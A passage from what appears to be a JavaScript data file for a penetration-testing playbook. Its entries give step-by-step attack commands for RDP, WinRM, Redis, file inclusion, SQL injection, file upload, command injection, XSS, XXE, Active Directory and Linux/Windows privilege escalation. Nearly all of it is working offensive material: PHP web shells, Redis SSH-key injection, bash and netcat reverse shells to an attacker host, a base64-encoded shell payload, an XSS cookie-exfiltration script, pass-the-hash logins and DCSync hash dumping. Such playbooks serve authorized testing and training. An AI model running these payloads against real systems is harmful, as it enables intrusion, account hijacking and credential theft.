        if_success: 'RDP settings identified! Note whether NLA is enforced.',
        if_failure: 'Port filtered. Check firewall.',
        references: ['https://book.hacktricks.xyz/network-services-pentesting/pentesting-rdp']
      },
      {
        id: 'rdp-xfreerdp-connect',
        title: 'Interactive RDP Login with Mounted Local Drive (xfreerdp)',
        phase: 'exploitation',
        purpose: 'Connect to the remote Windows desktop with dynamic resolution, clipboard sharing, and a mounted local folder for instant file exfiltration/tool loading.',
        command: "xfreerdp /u:'{{USERNAME}}' /p:'{{PASSWORD}}' /d:{{DOMAIN|corp.local}} /v:{{TARGET}} /dynamic-resolution +clipboard /drive:share,/tmp",
        expected_output: ['[Connected to Windows Graphical Desktop - Mounted drive accessible via \\\\tsclient\\share]'],
        common_mistakes: ['Inside the Windows RDP session, access your mounted Kali `/tmp` folder at `\\\\tsclient\\share` in File Explorer.'],
        if_success: 'Full interactive graphical Windows desktop acquired!',
        if_failure: 'Connection refused or credentials invalid. Test Pass-the-Hash with Restricted Admin.',
        references: ['https://book.hacktricks.xyz/network-services-pentesting/pentesting-rdp']
      },
      {
        id: 'rdp-pth-restricted-admin',
        title: 'Pass-the-Hash RDP Login (Restricted Admin Mode)',
        phase: 'exploitation',
        purpose: 'Log into RDP using an extracted NTLM password hash without cracking the cleartext password.',
        command: "xfreerdp /u:'{{USERNAME|Administrator}}' /pth:'{{HASH}}' /v:{{TARGET}} /restrictedAdmin",
        expected_output: ['[Connected to Administrator Desktop via Restricted Admin Mode]'],
        common_mistakes: ['Requires `DisableRestrictedAdmin` registry key set to `0` (or enabled via `reg add HKLM\\System\\CurrentControlSet\\Control\\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f`).'],
        if_success: 'Administrator RDP session established via Pass-the-Hash!',
        if_failure: 'Restricted Admin mode disabled on host. Use `evil-winrm -H {{HASH}}` instead.',
        references: ['https://book.hacktricks.xyz/network-services-pentesting/pentesting-rdp']
      }
    ]
  },

  // ==========================================
  // 21. WINRM (Port 5985 / 5986)
  // ==========================================
  {
    id: 'winrm',
    name: 'Windows Remote Management (WinRM - Port 5985 / 5986)',
    category: 'network',
    description: 'Methodology for WinRM management on ports 5985 (HTTP) and 5986 (HTTPS). Covers authentication probes, Evil-WinRM interactive shells, Pass-the-Hash, and PowerShell script loading.',
    port_triggers: [5985, 5986],
    service_triggers: ['winrm', 'wsman'],
    tags: ['winrm', 'evil-winrm', 'windows', 'remote-shell'],
    steps: [
      {
        id: 'winrm-auth-check',
        title: 'WinRM Authentication & Access Check (NetExec)',
        phase: 'reconnaissance',
        purpose: 'Validate WinRM credentials and verify if the user belongs to Remote Management Users or Local Administrators.',
        command: "netexec winrm {{TARGET}} -u '{{USERNAME}}' -p '{{PASSWORD}}'",
        expected_output: ['[+] WINRM {{TARGET}}:5985 (name:WIN-SERVER) (Pwn3d!)'],
        common_mistakes: ['Assuming WinRM is only for Administrators; users in `Remote Management Users` group can also log in.'],
        if_success: 'WinRM access confirmed! Launch interactive shell with Evil-WinRM.',
        if_failure: 'WinRM authentication failed or user lacks remote management permissions.',
        references: ['https://book.hacktricks.xyz/network-services-pentesting/5985-5986-pentesting-winrm']
      },
      {
        id: 'winrm-evil-shell',
        title: 'Interactive PowerShell Shell (Evil-WinRM)',
        phase: 'exploitation',
        purpose: 'Spawn a high-performance interactive PowerShell terminal with built-in script loading, file transfers, and in-memory execution.',
        command: "evil-winrm -i {{TARGET}} -u '{{USERNAME}}' -p '{{PASSWORD}}'",
        expected_output: ['*Evil-WinRM* PS C:\\Users\\{{USERNAME}}\\Documents>'],
        common_mistakes: ['Not testing Pass-the-Hash with `-H {{HASH}}` if only NTLM hash is known.'],
        if_success: 'Interactive shell acquired! Proceed to Windows privilege escalation triage.',
        if_failure: 'Connection rejected. Try SSL mode with `-s` if port 5986 is open.',
        references: ['https://book.hacktricks.xyz/network-services-pentesting/5985-5986-pentesting-winrm']
      },
      {
        id: 'winrm-pth-shell',
        title: 'Pass-the-Hash WinRM Login',
        phase: 'exploitation',
        purpose: 'Authenticate over WinRM using an extracted 32-character NTLM password hash without cracking it.',
        command: "evil-winrm -i {{TARGET}} -u '{{USERNAME|Administrator}}' -H '{{HASH}}'",
        expected_output: ['*Evil-WinRM* PS C:\\Users\\Administrator\\Documents>'],
        common_mistakes: ['Supplying the full `LM:NTLM` string; Evil-WinRM requires only the 32-character NTLM hash part.'],
        if_success: 'Administrator access confirmed via Pass-the-Hash!',
        if_failure: 'UAC remote restrictions blocking Local Admin. Check `LocalAccountTokenFilterPolicy`.',
        references: ['https://book.hacktricks.xyz/network-services-pentesting/5985-5986-pentesting-winrm']
      }
    ]
  },

  // ==========================================
  // 22. REDIS (Port 6379)
  // ==========================================
  {
    id: 'redis',
    name: 'Redis In-Memory Database Exploitation (Port 6379)',
    category: 'network',
    description: 'Methodology for unauthenticated and authenticated Redis servers on port 6379. Covers SSH key injection, Web shell drops, and Cron job reverse shell execution.',
    port_triggers: [6379],
    service_triggers: ['redis'],
    tags: ['redis', 'database', 'rce', 'ssh-injection'],
    steps: [
      {
        id: 'redis-ping-info',
        title: 'Redis Unauthenticated Probe & Server Info',
        phase: 'reconnaissance',
        purpose: 'Test if Redis allows unauthenticated connections and retrieve operating system, redis_version, and database keys.',
        command: 'redis-cli -h {{TARGET}} info',
        expected_output: ['# Server', 'redis_version:5.0.7', 'os:Linux 5.4.0-42-generic x86_64'],
        common_mistakes: ['If `NOAUTH Authentication required`, test common passwords from wordlist with `AUTH <password>`.'],
        if_success: 'Unauthenticated Redis access! Proceed to SSH authorized_keys injection or web shell drop.',
        if_failure: 'Password required. Try `hydra -P rockyou.txt redis://{{TARGET}}`.',
        references: ['https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis']
      },
      {
        id: 'redis-ssh-inject',
        title: 'SSH Authorized Keys Injection via Redis',
        phase: 'exploitation',
        purpose: 'Write your public SSH key into `/root/.ssh/authorized_keys` or `/home/user/.ssh/authorized_keys` using Redis database save commands.',
        command: '(echo -e "\\n\\n"; cat ~/.ssh/id_rsa.pub; echo -e "\\n\\n") > foo.txt && redis-cli -h {{TARGET}} -x set ssh_key < foo.txt && redis-cli -h {{TARGET}} config set dir /root/.ssh/ && redis-cli -h {{TARGET}} config set dbfilename authorized_keys && redis-cli -h {{TARGET}} save',
        expected_output: ['OK', 'OK', 'OK'],
        common_mistakes: ['Target must be running Redis as `root` or target user, and target user must allow SSH passwordless key login.'],
        if_success: 'SSH key written! Log in with `ssh root@{{TARGET}}`.',
        if_failure: 'Permission denied on `/root/.ssh/`. Try web directory `/var/www/html/` for PHP webshell drop.',
        references: ['https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis']
      },
      {
        id: 'redis-webshell-drop',
        title: 'Web Shell Drop into Webroot via Redis',
        phase: 'exploitation',
        purpose: 'If port 80/443 is running PHP, write a PHP web shell into `/var/www/html/` via Redis config.',
        command: 'redis-cli -h {{TARGET}} config set dir /var/www/html/ && redis-cli -h {{TARGET}} config set dbfilename shell.php && redis-cli -h {{TARGET}} set test "<?php system(\\$_GET[\'cmd\']); ?>" && redis-cli -h {{TARGET}} save',
        expected_output: ['OK', 'OK', 'OK'],
        common_mistakes: ['Webroot might be in custom folder like `/var/www/wordpress/` or `/opt/app/public/`.'],
        if_success: 'Web shell written! Execute commands: `curl "{{TARGET_URL}}/shell.php?cmd=id"`.',
        if_failure: 'Permission denied writing to `/var/www/html/`. Try cron job reverse shell.',
        references: ['https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis']
      }
    ]
  },

  // ==========================================
  // 23. WEB: FILE INCLUSION & WRAPPERS
  // ==========================================
  {
    id: 'file-inclusion',
    name: 'Local & Remote File Inclusion (LFI / RFI)',
    category: 'web',
    description: 'Methodology for LFI and RFI vulnerabilities. Covers Linux/Windows path traversal, PHP filter wrappers, php://input RCE, and log poisoning techniques.',
    port_triggers: [80, 443, 8000, 8080, 8443, 8978],
    service_triggers: ['http', 'https', 'web'],
    tags: ['lfi', 'rfi', 'wrappers', 'log-poisoning', 'web'],
    steps: [
      {
        id: 'lfi-path-traversal',
        title: 'Basic Path Traversal (/etc/passwd)',
        phase: 'enumeration',
        purpose: 'Test for unvalidated file inclusion by escaping the web root using `../` directory traversal sequences.',
        command: 'curl -s "{{TARGET_URL}}/index.php?page=../../../../etc/passwd"',
        expected_output: ['root:x:0:0:root:/root:/bin/bash', 'www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin'],
        common_mistakes: ['Not testing URL-encoded bypasses (`..%2f..%2f`) or double encoding (`%252e%252e%252f`).'],
        if_success: 'LFI confirmed! Read user accounts, source code, and configuration files.',
        if_failure: 'Blocked or not vulnerable. Test PHP base64 filter wrapper.',
        references: ['https://github.com/swisskyrepo/PayloadsAllTheThings', 'https://portswigger.net/web-security']
      },
      {
        id: 'lfi-php-filter',
        title: 'PHP Base64 Filter Wrapper Source Extraction',
        phase: 'enumeration',
        purpose: 'Extract raw PHP source code without execution using the `php://filter/convert.base64-encode` stream wrapper.',
        command: 'curl -s "{{TARGET_URL}}/index.php?page=php://filter/convert.base64-encode/resource=config.php" | base64 -d',
        expected_output: ['<?php', '  $db_host = "localhost";', '  $db_pass = "SuperSecretDBPassword!";'],
        common_mistakes: ['Including the `.php` extension in resource parameter if the application automatically appends `.php`.'],
        if_success: 'Source code recovered! Inspect for hardcoded database passwords, API keys, and admin credentials.',
        if_failure: 'Filter wrapper blocked. Test Apache access log poisoning.',
        references: ['https://github.com/swisskyrepo/PayloadsAllTheThings']
      },
      {
        id: 'lfi-php-input',
        title: 'PHP Input Wrapper RCE (php://input)',
        phase: 'exploitation',
        purpose: 'Execute arbitrary PHP code by posting code to the `php://input` stream if `allow_url_include = On`.',
        command: "curl -s -X POST --data \"<?php system('id; whoami'); ?>\" \"{{TARGET_URL}}/index.php?page=php://input\"",
        expected_output: ['uid=33(www-data) gid=33(www-data) groups=33(www-data)'],
        common_mistakes: ['Requires `allow_url_include` to be enabled in `php.ini`.'],
        if_success: 'Direct RCE achieved! Spawn reverse shell: `curl -X POST --data "<?php system(\'bash -i >& /dev/tcp/{{LHOST|10.10.14.2}}/4444 0>&1\'); ?>" "{{TARGET_URL}}/index.php?page=php://input"`',
        if_failure: 'php://input refused. Test Apache/Nginx log poisoning.',
        references: ['https://github.com/swisskyrepo/PayloadsAllTheThings']
      },
      {
        id: 'lfi-apache-log-poison',
        title: 'Apache Access Log Poisoning RCE',
        phase: 'exploitation',
        purpose: 'Inject PHP execution code into the Apache access log via User-Agent/URL request, then include `/var/log/apache2/access.log`.',
        command: 'nc -nv {{TARGET}} {{PORT|80}} -c "GET <?php system(\\$_GET[\'c\']); ?> HTTP/1.1\\r\\nHost: {{TARGET}}\\r\\n\\r\\n" && curl -s "{{TARGET_URL}}/index.php?page=/var/log/apache2/access.log&c=id"',
        expected_output: ['uid=33(www-data) gid=33(www-data) groups=33(www-data)'],
        common_mistakes: ['Using browser URL bar to inject PHP code; browsers URL-encode `<` and `>`, breaking PHP execution. Use `nc` or `curl`.'],
        if_success: 'Log poisoned and command executed! Spawn reverse shell with parameter `&c=...`.',
        if_failure: 'Log file not readable by www-data. Check SSH auth log `/var/log/auth.log` poisoning.',
        references: ['https://github.com/swisskyrepo/PayloadsAllTheThings']
      }
    ]
  },

  // ==========================================
  // 24. WEB: SQL INJECTION
  // ==========================================
  {
    id: 'sqli-sqlmap',
    name: 'SQL Injection & SQLMap Exploitation',
    category: 'web',
    description: 'Methodology for SQL Injection vulnerabilities. Covers authentication bypasses, manual UNION column extraction, database fingerprinting, automated SQLMap dumping, and OS shells.',
    port_triggers: [80, 443, 8000, 8080, 8443, 8978],
    service_triggers: ['http', 'https', 'web'],
    tags: ['sqli', 'sqlmap', 'database', 'web'],
    steps: [
      {
        id: 'sqli-auth-bypass',
        title: 'Authentication Form SQL Bypass',
        phase: 'exploitation',
        purpose: 'Bypass login authentication by injecting boolean tautology payloads into username/password parameters.',
        command: "curl -s -X POST -d \"username=admin' OR 1=1-- -&password=foo\" \"{{TARGET_URL}}/login.php\" -i",
        expected_output: ['HTTP/1.1 302 Found', 'Location: dashboard.php', 'Set-Cookie: session=eyJ...'],
        common_mistakes: ['Not testing comment variations for different database engines: MySQL (`-- -`, `#`), MSSQL (`--`), SQLite (`--`).'],
        if_success: 'Bypassed authentication! Use session cookie in browser to access admin dashboard.',
        if_failure: 'Login failed. Try manual UNION-based SQLi discovery.',
        references: ['https://portswigger.net/web-security/sql-injection']
      },
      {
        id: 'sqli-union-columns',
        title: 'Manual Column Count Discovery (ORDER BY)',
        phase: 'enumeration',
        purpose: 'Determine the exact number of columns returned by the query by incrementing `ORDER BY N` until an error occurs.',
        command: "curl -s \"{{TARGET_URL}}/search.php?id=1' ORDER BY 5-- -\"",
        expected_output: ['Unknown column 5 in order clause (Means query has exactly 4 columns)'],
        common_mistakes: ['Column indexing is 1-based; if ORDER BY 5 errors but ORDER BY 4 succeeds, you have 4 columns.'],
        if_success: 'Column count identified! Proceed to UNION SELECT banner and credential dumping.',
        if_failure: 'No error returned. Test boolean-based blind or time-based blind SQLi.',
        references: ['https://portswigger.net/web-security/sql-injection']
      },
      {
        id: 'sqli-sqlmap-dump',
        title: 'Automated Database Dump (SQLMap)',
        phase: 'exploitation',
        purpose: 'Use SQLMap to automatically enumerate DBMS databases, tables, and dump application user credentials.',
        command: 'sqlmap -u "{{TARGET_URL}}/search.php?id=1" --batch --dbs --dump',
        expected_output: ['[+] Available databases: [app_db, mysql, information_schema]', 'Database: app_db | Table: users | 2 entries dumped'],
        common_mistakes: ['Not passing session cookies with `--cookie` when scanning authenticated endpoints.'],
        if_success: 'Database dumped! Extract password hashes and crack with Hashcat.',
        if_failure: 'WAF blocking SQLMap requests. Add `--tamper=space2comment,between` flags.',
        references: ['https://portswigger.net/web-security/sql-injection']
      },
      {
        id: 'sqli-os-shell',
        title: 'SQLMap Interactive OS Shell Drop',
        phase: 'exploitation',
        purpose: 'Upload a web shell via SQL injection (INTO OUTFILE / xp_cmdshell) to obtain an interactive operating system shell.',
        command: 'sqlmap -u "{{TARGET_URL}}/search.php?id=1" --os-shell --batch',
        expected_output: ['[+] Which web application language does the web server support? [1] PHP', 'os-shell> whoami'],
        common_mistakes: ['Requires writable directory permission in webroot or database administrative privileges.'],
        if_success: 'Operating system shell spawned! Proceed to privilege escalation.',
        if_failure: 'File write permission denied. Manually inspect extracted database credentials.',
        references: ['https://portswigger.net/web-security/sql-injection']
      }
    ]
  },

  // ==========================================
  // 25. WEB: FILE UPLOAD ATTACKS
  // ==========================================
  {
    id: 'file-upload',
    name: 'File Upload Attacks & Filter Bypasses',
    category: 'web',
    description: 'Methodology for exploiting unvalidated file uploads. Covers extension blacklisting bypasses (.phtml, .php5), MIME-type spoofing, magic bytes injection, and polyglot shells.',
    port_triggers: [80, 443, 8000, 8080, 8443, 8978],
    service_triggers: ['http', 'https', 'web'],
    tags: ['upload', 'webshell', 'bypasses', 'web'],
    steps: [
      {
        id: 'upload-phtml-bypass',
        title: 'Extension Blacklist Bypass (.phtml / .php5)',
        phase: 'exploitation',
        purpose: 'Bypass weak file upload extension blacklists using alternate executable extensions (.phtml, .php5, .phar, .inc).',
        command: "echo '<?php system($_GET[\"cmd\"]); ?>' > shell.phtml && curl -X POST -F 'file=@shell.phtml' {{TARGET_URL}}/upload.php",
        expected_output: ['{"status":"success","path":"uploads/shell.phtml"}'],
        common_mistakes: ['Not checking file upload location in HTTP response or JavaScript upload handler.'],
        if_success: 'Web shell uploaded! Test command: `curl "{{TARGET_URL}}/uploads/shell.phtml?cmd=id"`.',
        if_failure: 'File rejected. Test MIME-type and Magic Byte spoofing.',
        references: ['https://portswigger.net/web-security/file-upload']
      },
      {
        id: 'upload-magic-bytes',
        title: 'Magic Bytes & Content-Type Spoofing (GIF89a)',
        phase: 'exploitation',
        purpose: 'Bypass server-side image validation (getimagesize / fileinfo) by prepending GIF89a magic bytes header.',
        command: '(echo "GIF89a;"; echo "<?php system(\\$_GET[\'cmd\']); ?>") > shell.gif.php && curl -X POST -F "file=@shell.gif.php;type=image/gif" {{TARGET_URL}}/upload.php',
        expected_output: ['Upload successful: uploads/shell.gif.php'],
        common_mistakes: ['Not spoofing both the Content-Type header (`image/gif`) AND magic bytes header in file body.'],
        if_success: 'Magic byte check bypassed! Execute commands via `{{TARGET_URL}}/uploads/shell.gif.php?cmd=whoami`.',
        if_failure: 'File renamed or image re-encoded. Test .htaccess or .user.ini override.',
        references: ['https://portswigger.net/web-security/file-upload']
      }
    ]
  },

  // ==========================================
  // 26. WEB: COMMAND INJECTION
  // ==========================================
  {
    id: 'command-injection',
    name: 'OS Command Injection & Filter Bypasses',
    category: 'web',
    description: 'Methodology for Command Injection vulnerabilities. Covers command separators (; && |), space filter bypasses (${IFS}), base64 encoding execution, and out-of-band exfiltration.',
    port_triggers: [80, 443, 8000, 8080, 8443, 8978],
    service_triggers: ['http', 'https', 'web'],
    tags: ['command-injection', 'rce', 'bypasses', 'web'],
    steps: [
      {
        id: 'cmd-separator-test',
        title: 'Command Separator Discovery (; | && || `)',
        phase: 'exploitation',
        purpose: 'Test command delimiters to break out of expected input and execute operating system commands.',
        command: 'curl -s "{{TARGET_URL}}/ping.php?ip=127.0.0.1%3Bid"',
        expected_output: ['PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.', 'uid=33(www-data) gid=33(www-data) groups=33(www-data)'],
        common_mistakes: ['Not URL-encoding delimiters: `;` is `%3B`, `&` is `%26`, `|` is `%7C`, space is `%20` or `+`.'],
        if_success: 'Direct command injection confirmed! Proceed to reverse shell execution.',
        if_failure: 'Input sanitized. Test space bypasses with `${IFS}`.',
        references: ['https://portswigger.net/web-security/os-command-injection']
      },
      {
        id: 'cmd-space-bypass',
        title: 'Space Filter Bypass via ${IFS}',
        phase: 'exploitation',
        purpose: 'Bypass input filters stripping spaces using the Linux Internal Field Separator `${IFS}` variable.',
        command: 'curl -s "{{TARGET_URL}}/ping.php?ip=127.0.0.1%3Bcat\${IFS}/etc/passwd"',
        expected_output: ['root:x:0:0:root:/root:/bin/bash'],
        common_mistakes: ['On Windows machines, use `%ProgramFiles:~10,1%` or redirection operators (`type<file.txt`) instead of `${IFS}`.'],
        if_success: 'Space filter bypassed! Use `${IFS}` to structure reverse shell payload.',
        if_failure: 'Character filter active. Use Base64 pipe execution.',
        references: ['https://portswigger.net/web-security/os-command-injection']
      },
      {
        id: 'cmd-base64-exec',
        title: 'Base64 Encoded Payload Execution',
        phase: 'exploitation',
        purpose: 'Bypass all character filters by encoding the entire reverse shell string into Base64 and piping it to bash.',
        command: "curl -s \"{{TARGET_URL}}/ping.php?ip=127.0.0.1%3Becho\${IFS}YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yLzQ0NDQgMD4mMQ==|base64\${IFS}-d|bash\"",
        expected_output: ['[Kali Listener: nc -lvnp 4444 -> Connection received from {{TARGET}}]'],
        common_mistakes: ['Starting command before launching your netcat listener: `nc -lvnp 4444`.'],
        if_success: 'Interactive reverse shell received on Kali! Stabilize TTY shell.',
        if_failure: 'Outbound TCP connection blocked. Try HTTP/DNS out-of-band reverse shell.',
        references: ['https://portswigger.net/web-security/os-command-injection']
      }
    ]
  },

  // ==========================================
  // 27. WEB: CROSS-SITE SCRIPTING (XSS)
  // ==========================================
  {
    id: 'xss',
    name: 'Cross-Site Scripting (XSS) & Cookie Stealing',
    category: 'web',
    description: 'Methodology for Reflected and Stored XSS. Covers payload execution verification, bypassing script filters, and capturing administrator session cookies with Netcat listener.',
    port_triggers: [80, 443, 8000, 8080, 8443, 8978],
    service_triggers: ['http', 'https', 'web'],
    tags: ['xss', 'cookie-stealing', 'javascript', 'web'],
    steps: [
      {
        id: 'xss-cookie-stealer',
        title: 'Session Cookie Exfiltration Payload',
        phase: 'exploitation',
        purpose: 'Inject JavaScript that sends the authenticated user or admin session cookies back to your Kali listener.',
        command: "nc -lvnp 8000 & curl -s -X POST -d \"comment=<script>fetch('http://{{LHOST|10.10.14.2}}:8000/?c='+document.cookie)</script>\" \"{{TARGET_URL}}/comment.php\"",
        expected_output: ['[Listener 8000] GET /?c=PHPSESSID=9a8fbc...; admin_session=eyJhb...'],
        common_mistakes: ['If `<script>` tags are stripped, use image event handler: `<img src=x onerror="fetch(\'http://{{LHOST}}:8000/?c=\'+document.cookie)">`.'],
        if_success: 'Session cookie captured! Import cookie into browser to hijack administrator account.',
        if_failure: 'Cookie has `HttpOnly` flag. Try keylogger payload or form credential phishing.',
        references: ['https://portswigger.net/web-security/cross-site-scripting']
      }
    ]
  },

  // ==========================================
  // 28. WEB: XML EXTERNAL ENTITY (XXE)
  // ==========================================
  {
    id: 'xxe',
    name: 'XML External Entity (XXE) Injection',
    category: 'web',
    description: 'Methodology for XML External Entity (XXE) vulnerabilities in XML parsers. Covers reading local system files, PHP source filter wrappers, and blind out-of-band DTD exfiltration.',
    port_triggers: [80, 443, 8000, 8080, 8443, 8978],
    service_triggers: ['http', 'https', 'web'],
    tags: ['xxe', 'xml', 'file-disclosure', 'web'],
    steps: [
      {
        id: 'xxe-file-read',
        title: 'Classic Local File Disclosure (XXE)',
        phase: 'exploitation',
        purpose: 'Define an external entity referencing `file:///etc/passwd` to display system file contents in the HTTP response.',
        command: 'curl -s -X POST -H "Content-Type: application/xml" -d \'<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root><name>&test;</name></root>\' "{{TARGET_URL}}/api/xml"',
        expected_output: ['<root><name>root:x:0:0:root:/root:/bin/bash...</name></root>'],
        common_mistakes: ['On Windows targets, query `file:///c:/windows/system32/drivers/etc/hosts`.'],
        if_success: 'System files disclosed! Read application source code and credentials.',
        if_failure: 'Response does not reflect entity value. Test Blind Out-of-Band XXE.',
        references: ['https://portswigger.net/web-security/xxe']
      }
    ]
  },

  // ==========================================
  // 29. ACTIVE DIRECTORY ATTACKS
  // ==========================================
  {
    id: 'ad-attacks',
    name: 'Active Directory Lateral Movement & Dominance',
    category: 'ad',
    description: 'Methodology for Active Directory post-foothold attacks. Covers DCSync NTDS password dumping, Pass-the-Hash, AD CS certificate template abuse, and Golden Tickets.',
    port_triggers: [88, 389, 445],
    service_triggers: ['kerberos', 'ldap', 'smb'],
    tags: ['active-directory', 'dcsync', 'pass-the-hash', 'adcs', 'kerberos'],
    steps: [
      {
        id: 'ad-dcsync-dump',
        title: 'DCSync Domain NTDS Password Hash Extraction',
        phase: 'privesc',
        purpose: 'Impersonate a Domain Controller using DS-Replication permissions to dump all user NTLM hashes directly from Active Directory.',
        command: "impacket-secretsdump '{{DOMAIN|corp.local}}/{{USERNAME}}:{{PASSWORD}}@{{TARGET}}' -just-dc-ntlm",
        expected_output: ['Administrator:500:aad3b435...:31d6cfe0d16ae931b73c59d7e0c089c0:::', 'krbtgt:502:aad3b435...:284d728d84a7e91...:::'],
        common_mistakes: ['User must have `Replicating Directory Changes` rights (Domain Admins, Enterprise Admins, or delegated sync accounts).'],
        if_success: 'Domain-wide compromise! Captured Administrator and krbtgt NTLM hashes.',
        if_failure: 'Insufficient replication privileges. Check BloodHound for ACL abuse paths to Domain Admin.',
        references: ['https://wadcoms.github.io/']
      },
      {
        id: 'ad-pass-the-hash',
        title: 'Pass-the-Hash Remote Command Execution',
        phase: 'privesc',
        purpose: 'Execute commands on any domain host using an extracted NTLM password hash without cracking the cleartext password.',
        command: "impacket-wmiexec -hashes ':{{HASH}}' '{{DOMAIN|corp.local}}/{{USERNAME|Administrator}}@{{TARGET}}'",
        expected_output: ['[*] SMBv2.1 dialect used', '[*] Authenticating as {{DOMAIN}}\\Administrator...', 'C:\\Windows\\system32>'],
        common_mistakes: ['Passing the LM hash; place a colon before the 32-character NTLM hash: `-hashes :31d6cfe...`.'],
        if_success: 'Interactive Administrator shell spawned over WMI!',
        if_failure: 'WMI blocked. Try `impacket-psexec` or `evil-winrm -H {{HASH}}`.',
        references: ['https://wadcoms.github.io/']
      }
    ]
  },

  // ==========================================
  // 30. PRIVILEGE ESCALATION: LINUX
  // ==========================================
  {
    id: 'linux-privesc',
    name: 'Linux Local Privilege Escalation',
    category: 'privesc',
    description: 'Comprehensive methodology for escalating privileges on compromised Linux machines. Covers sudo rights, SUID binaries, docker group socket escapes, capabilities, writable cron jobs, and unshadow.',
    requires_shell: true,
    target_os: 'linux',
    port_triggers: [],
    tags: ['linux', 'privesc', 'sudo', 'suid', 'docker', 'capabilities'],
    steps: [
      {
        id: 'linux-sudo-check',
        title: 'Sudo Rights & NOPASSWD Checks',
        phase: 'enumeration',
        purpose: 'Inspect what commands the current user can execute as superuser (root) without password verification.',
        command: 'sudo -l',
        expected_output: ['User developer may run the following commands on target:', '    (ALL : ALL) NOPASSWD: /usr/bin/find'],
        common_mistakes: ['Not checking GTFOBins (https://gtfobins.github.io/) for allowed sudo binary bypasses.'],
        if_success: 'Sudo command found! Look up binary on GTFOBins: `sudo find . -exec /bin/sh \\; -quit` to get root.',
        if_failure: 'Password required or no sudo rights. Proceed to SUID binary discovery.',
        references: ['https://gtfobins.github.io/', 'https://book.hacktricks.xyz/linux-hardening/privilege-escalation']
      },
      {
        id: 'linux-suid-bins',
        title: 'SUID & SGID Binaries Discovery',
        phase: 'enumeration',
        purpose: 'Find binaries with the SUID bit set that execute with the privileges of the file owner (root).',
        command: 'find / -perm -4000 -type f -exec ls -la {} + 2>/dev/null',
        expected_output: ['-rwsr-xr-x 1 root root  44120 Jan 15 2022 /usr/bin/passwd', '-rwsr-xr-x 1 root root 124312 May 10 2023 /usr/local/bin/custom_backup'],
        common_mistakes: ['Ignoring non-standard custom binaries in `/opt/`, `/tmp/`, or `/usr/local/bin/`.'],
        if_success: 'Custom SUID found! Run `strings <binary>` or `ltrace <binary>` to inspect for unquoted path hijacking.',
        if_failure: 'Only standard SUID binaries found. Check capabilities and group memberships.',
        references: ['https://gtfobins.github.io/']
      },
      {
        id: 'linux-docker-escape',
        title: 'Privilege Escalation via Docker Group / Socket',
        phase: 'exploitation',
        purpose: 'If current user belongs to "docker" group or has write access to `/var/run/docker.sock`, mount host root filesystem inside a container.',
        command: 'docker run -v /:/mnt --rm -it alpine chroot /mnt sh',
        expected_output: ['# whoami', 'root', '# cat /root/root.txt'],
        common_mistakes: ['If alpine image is missing locally, run `docker images` to find any pre-installed container image.'],
        if_success: 'Immediate root access achieved inside host root filesystem mount!',
        if_failure: 'User not in docker group. Check LXD or capabilities.',
        references: ['https://gtfobins.github.io/']
      },
      {
        id: 'linux-caps-check',
        title: 'Linux Capabilities Inspection (getcap)',
        phase: 'enumeration',
        purpose: 'Inspect binaries with granted POSIX capabilities (e.g. `cap_setuid+ep`, `cap_dac_read_search+ep`).',
        command: 'getcap -r / 2>/dev/null',
        expected_output: ['/usr/bin/python3.8 = cap_setuid+ep', '/usr/bin/tar = cap_dac_read_search+ep'],
        common_mistakes: ['Not checking GTFOBins Capabilities section for binary bypasses.'],
        if_success: 'Exploitable capability found! E.g. python3: `/usr/bin/python3 -c "import os; os.setuid(0); os.system(\'/bin/bash\')"` gives root.',
        if_failure: 'No custom capabilities. Proceed to cron job and writable path inspection.',
        references: ['https://gtfobins.github.io/']
      }
    ]
  },

  // ==========================================
  // 31. PRIVILEGE ESCALATION: WINDOWS
  // ==========================================
  {
    id: 'windows-privesc',
    name: 'Windows Local Privilege Escalation',
    category: 'privesc',
    description: 'Comprehensive methodology for escalating privileges on Windows machines. Covers SeImpersonate (Potato attacks), Unquoted Service Paths, Modifiable Services, and AlwaysInstallElevated MSI.',
    requires_shell: true,
    target_os: 'windows',
    port_triggers: [],
    tags: ['windows', 'privesc', 'potato', 'services', 'msi'],
    steps: [
      {
        id: 'win-privs-triage',
        title: 'Current Privileges & Token Triage (whoami /priv)',
        phase: 'enumeration',
        purpose: 'Check enabled tokens and privileges for SeImpersonatePrivilege, SeAssignPrimaryToken, or SeBackupPrivilege.',
        command: 'whoami /priv',
        expected_output: ['Privilege Name                Description                               State', 'SeImpersonatePrivilege        Impersonate a client after authentication Enabled', 'SeBackupPrivilege             Back up files and directories             Disabled'],
        common_mistakes: ['Ignoring `SeImpersonatePrivilege`; service accounts like `iis apppool\\...` or `LOCAL SERVICE` almost always have it enabled.'],
        if_success: '`SeImpersonatePrivilege` is Enabled! Proceed directly to GodPotato / SweetPotato exploit.',
        if_failure: 'Token not present. Proceed to service and registry inspection.',
        references: ['https://lolbas-project.github.io/']
      },
      {
        id: 'win-godpotato-exploit',
        title: 'Potato Exploit (SeImpersonatePrivilege -> SYSTEM)',
        phase: 'exploitation',
        purpose: 'Abuse DCOM / RPC impersonation to elevate from service account to NT AUTHORITY\\SYSTEM.',
        command: 'GodPotato-NET4.exe -cmd "cmd.exe /c whoami"',
        expected_output: ['[*] Impersonate token result: 0', '[*] Process created: C:\\Windows\\system32\\cmd.exe', 'nt authority\\system'],
        common_mistakes: ['Target OS version determines potato flavor: Windows 10/Server 2019+ use `GodPotato`, older use `JuicyPotato`.'],
        if_success: 'Elevated to SYSTEM! Execute reverse shell: `GodPotato-NET4.exe -cmd "nc.exe {{LHOST|10.10.14.2}} 4444 -e cmd.exe"`',
        if_failure: 'Potato blocked. Check Unquoted Service Paths.',
        references: ['https://lolbas-project.github.io/']
      },
      {
        id: 'win-unquoted-services',
        title: 'Unquoted Service Paths Discovery',
        phase: 'enumeration',
        purpose: 'Find Windows services with unquoted paths containing spaces that allow DLL/EXE hijacking in parent directories.',
        command: 'wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\\Windows\\\\" |findstr /i /v """',
        expected_output: ['My Service    C:\\Program Files\\Custom App\\service.exe    Auto'],
